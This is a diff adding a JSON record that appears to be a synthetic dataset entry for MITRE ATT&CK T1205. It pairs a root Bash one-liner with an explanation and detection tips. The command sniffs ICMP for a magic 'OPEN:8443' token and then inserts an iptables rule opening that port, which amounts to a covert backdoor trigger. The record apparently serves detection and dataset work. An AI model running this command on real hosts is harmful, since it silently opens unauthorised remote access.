@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1205",
+  "platform": "Network Devices",
+  "shell": "Bash",
+  "command": "sudo bash -c 'tcpdump -ln -i eth0 -A icmp and dst host 203.0.113.1 | grep -m1 OPEN:8443 && iptables -I INPUT -p tcp --dport 8443 -j ACCEPT'",
+  "explanation": "Sniffs ICMP on eth0 and waits for the magic payload 'OPEN:8443'; upon detection, inserts an iptables rule to open TCP/8443, implementing covert activation. Requires root for tcpdump and iptables. Detection: monitor tcpdump invocation on network devices and alert on real-time firewall rule insertions tied to packet content.",
+  "rationale_steps": [
+    "Start tcpdump in line-buffered ASCII mode to observe payload.",
+    "Block until the magic token appears, then proceed.",
+    "Open the targeted TCP port via iptables insertion.",
+    "Detection: audit command history/process creation of tcpdump and firewall changes; baseline expected ICMP flows."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1205-bba1a632-62e19959",
+  "source_prompt_hash": "bba1a632",
+  "timestamp_utc": "2025-09-30T05:49:31.290544Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
